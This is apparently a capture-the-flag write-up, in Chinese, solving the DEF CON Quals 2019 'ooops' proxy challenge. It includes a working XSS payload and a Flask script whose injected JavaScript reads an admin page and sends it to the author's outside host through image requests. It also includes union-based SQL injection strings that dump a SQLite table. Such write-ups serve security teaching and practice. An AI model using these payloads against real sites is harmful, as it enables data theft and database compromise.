# ooops

## info.pac

題目只給這個檔案

裡頭內容:

```javascript
eval((function(){var s=Array.prototype.slice.call(arguments),G=s.shift();return s.reverse().map(function(f,i){return String.fromCharCode(f-G-19-i)}).join('')})(29,202,274,265,261,254,265,251,267,227,179,247,249,260,175,244,252,172,253,239,237,250,214,166,248,237,163,245,244,229,226,225,222,156,233,219,220,152,234,219,218,237,226,222,225,221,212,142,228,219,215,208,219,205,221,213,133,221,207,208,208,128,196,198,177,124,133,137,121,120,97,209,117,125,199,197,192,184,111,122,185,190,192,114,183,183,176,186,168,178,184,168,97,125,95,138,143,145,173,169,127,177,175,165,167,132,151,160,154,118)+(16).toString(36).toLowerCase().split('').map(function(c){return String.fromCharCode(c.charCodeAt()+(-71))}).join('')+(28).toString(36).toLowerCase().split('').map(function(d){return String.fromCharCode(d.charCodeAt()+(-39))}).join('')+(880).toString(36).toLowerCase()+(16).toString(36).toLowerCase().split('').map(function(I){return String.fromCharCode(I.charCodeAt()+(-71))}).join('')+(671).toString(36).toLowerCase()+(16).toString(36).toLowerCase().split('').map(function(p){return String.fromCharCode(p.charCodeAt()+(-71))}).join('')+(1517381).toString(36).toLowerCase()+(16).toString(36).toLowerCase().split('').map(function(W){return String.fromCharCode(W.charCodeAt()+(-71))}).join('')+(31).toString(36).toLowerCase().split('').map(function(x){return String.fromCharCode(x.charCodeAt()+(-39))}).join('')+(30598).toString(36).toLowerCase()+(31).toString(36).toLowerCase().split('').map(function(M){return String.fromCharCode(M.charCodeAt()+(-39))}).join('')+(842).toString(36).toLowerCase()+(function(){var T=Array.prototype.slice.call(arguments),F=T.shift();return T.reverse().map(function(Q,S){return String.fromCharCode(Q-F-18-S)}).join('')})(36,161,205,187,188,200,190,184,154,146,223,226,228,226,210,222,139,147,146,143,214,207,147,219,210,206,199,210,196,212,204,203,202,129,121,132,203,201,196,188,123,186,180,196,176,155,189,196,144,178,188,112,103,172,174,100,99,76,112,106,95,181,172,168,161,172,158,174,134,112)+(11).toString(36).toLowerCase().split('').map(function(H){return String.fromCharCode(H.charCodeAt()+(-39))}).join('')+(1657494275).toString(36).toLowerCase()+(599).toString(36).toLowerCase().split('').map(function(o){return String.fromCharCode(o.charCodeAt()+(-71))}).join('')+(42727).toString(36).toLowerCase().split('').map(function(p){return String.fromCharCode(p.charCodeAt()+(-39))}).join('')+(519).toString(36).toLowerCase().split('').map(function(i){return String.fromCharCode(i.charCodeAt()+(-13))}).join('')+(16).toString(36).toLowerCase().split('').map(function(V){return String.fromCharCode(V.charCodeAt()+(-71))}).join('')+(41462560).toString(36).toLowerCase()+(30).toString(36).toLowerCase().split('').map(function(h){return String.fromCharCode(h.charCodeAt()+(-71))}).join('')+(2103412979233).toString(36).toLowerCase()+(function(){var n=Array.prototype.slice.call(arguments),z=n.shift();return n.reverse().map(function(l,V){return String.fromCharCode(l-z-58-V)}).join('')})(9,190,182,181,180,114,124)+(892604048).toString(36).toLowerCase()+(30).toString(36).toLowerCase().split('').map(function(T){return String.fromCharCode(T.charCodeAt()+(-71))}).join('')+(18).toString(36).toLowerCase()+(function(){var V=Array.prototype.slice.call(arguments),v=V.shift();return V.reverse().map(function(i,Y){return String.fromCharCode(i-v-53-Y)}).join('')})(48,160,212)+(8).toString(36).toLowerCase()+(function(){var q=Array.prototype.slice.call(arguments),b=q.shift();return q.reverse().map(function(X,r){return String.fromCharCode(X-b-11-r)}).join('')})(1,54,62,69,60)+(11).toString(36).toLowerCase().split('').map(function(y){return String.fromCharCode(y.charCodeAt()+(-39))}).join('')+(20).toString(36).toLowerCase().split('').map(function(S){return String.fromCharCode(S.charCodeAt()+(-97))}).join('')+(function(){var u=Array.prototype.slice.call(arguments),r=u.shift();return u.reverse().map(function(e,v){return String.fromCharCode(e-r-55-v)}).join('')})(27,207));
```

把`eval`拿掉，可以發現裡頭其實是一個function:

```javascript
FindProxyForURL = function(url, host) {\n  /* The only overflow employees can access is Order of the Overflow. Log in with OnlyOne:Overflow */\n  if (shExpMatch(host, \'oooverflow.io\')) return \'DIRECT\';return \'PROXY ooops.quals2019.oooverflow.io:8080\';\n}
```

## proxy

裡面告訴我們proxy的帳號和密碼: `OnlyOne:Overflow`

開個瀏覽器，用這組帳密連他的proxy: `ooops.quals2019.oooverflow.io:8080`

然後可以發現只要Request URL帶有`oooverflow`都會變成Unblock Request的頁面

其中`/ooops/d35fs23hu73ds/review.html`可以回報`url`和`justification`

嘗試回報自己的機器，會收到以下Request:

```
GET /test HTTP/1.0
accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
referer: http://10.0.1.101:5000/admin/view/14
user-agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
proxy-authorization: Basic T25seU9uZTpPdmVyZmxvdw==
connection: close
accept-encoding: gzip, deflate
accept-language: en,*
host: kaibro.tw:2222
X-Forwarded-For: 10.0.1.101
```

## XSS

main.js:

```javascript
function split_url(u) {
    u = decodeURIComponent(u); // Stringify
    output = u[0];
    for (i=1;i<u.length;i++) {
        output += u[i]
        if (i%55==0) output+= "<br/>";
    }
    console.log(output)
    return output
}
window.onload = function () { 
    d = document.getElementById("blocked");
    d.innerHTML=(split_url(document.location) + " is blocked")
}
```

這邊他會把我們的Request path每 `55` 個字元塞一個`<br>`，之後放進`innerHTML`中

很明顯可以XSS

(可以透過`/**/`註解的方式，去搞定中間塞`<br>`的問題)

e.g. `/1111111111111111111<svg/onload="alert();/*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*/alert(123);">`

不過有個問題，Bot的domain和我們丟給他的`url`要相同，不然Cross-site會沒辦法XSS讀Response

這邊有兩種方法可以讓它Same-origin: 1. DNS Rebindding  2. 利用前面的方式，塞`10.*.*.*/oooverflow`強制讓他訪問Unblock Request頁面去XSS

## Read Response

由於他每次訪問的IP都不同，所以為了要Same-origin，我們必須先抓出`X-Forwarded-For`的來源

再Redirect到這個IP上去做XSS

以下改自@bookgin的腳本:

```python
#!/usr/bin/env python3
from flask import Flask, request, redirect
import base64

app = Flask(__name__)

def genurl(ip): # e.g. 10.1.2.3:5000
    def b64e(x):
        return base64.b64encode(x.encode()).decode()

    host = 'http://'+ip+'/oooverflow'

    js = '''
var snd = function(data) {
document.getElementsByTagName('body')[0].appendChild(document.createElement('img')).src='http://kaibro.tw:5000/a?'+data;
}

setInterval(function(){snd('ping');},500+500);

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var txt = xhr.responseText;
snd(btoa(txt));
}
}
xhr.open('GET', 'http://REPLACEME/admin/view/1', true);
xhr.send(null);
'''.replace('REPLACEME', ip)

    assert '"' not in js
    b64_js = b64e(js)

    xss = '<img src=x onerror="eval(atob(\'{}\'))">'.format(b64_js)
    delimeter = "'/**/+'"
    payload = 'bbbb' # shift 4 bytes
    delta = 55 - len(delimeter)
    for i in range(0, len(xss), delta):
        print(xss[i:i+delta] + delimeter)
        payload += xss[i:i+delta] + delimeter
    payload = payload[:-len(delimeter)] # remove last delimeter
    payload = host.ljust(56, 'a') + payload
    return payload

@app.route('/')
def index():
    ip = request.environ.get('HTTP_X_FORWARDED_FOR').rsplit(',')[-1]
    ip = ip + ':5000'
    return redirect(genurl(ip), code=302)

if __name__ == '__main__':
    app.run(port=5000, host="0.0.0.0")
```

之後我們只要提交`http://yourdomain:5000`即可收到`/admin/view/1`的Response內容

會收到類似下面的Response:

```html
<!doctype html>
<html>
<head>
<title>OOOPS &mdash; Evaluate Requests</title>

<link href="/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"></head>
<body>
<div class="container">
<div class="row">

<!-- Query: select rowid,* from requests where rowid=1 -->

<p>
Request #1 from 2.
 Automatically evaluated
</p>

<a id="lnk" class="btn btn-secondary btn-block btn-lg" href="1">
Visit 1
</a>

</div>
</div>
</body>
</html>
```

可以注意到其中有句註解`<!-- Query: select rowid,* from requests where rowid=1 -->`

看起來87%是要做SQL Injection

## SQL Injection

一樣，從XSS那邊去試著對admin panel做SQL Injection:

訪問: `http://10.*.*.*:5000/admin/view/1 order by 10`

得到:

```
SQL Error: 1st ORDER BY term out of range - should be between 1 and 5
```

所以可以知道欄位個數有 5 個，而且從ERROR Message可以知道是SQLite

<br>

訪問: `http://10.*.*.*:5000/admin/view/1 and 1=2 union select 1,2,3,sql,5 FROM sqlite_master WHERE type='table'`

得到表結構:

```
CREATE TABLE flag (name TEXT, flag TEXT)
```

<br>

訪問: `http://10.*.*.*:5000/admin/view/1 and 1=2 union select 1,2,3,flag,5 FROM flag`

得到flag:

```
OOO{C0rporateIns3curity}
```

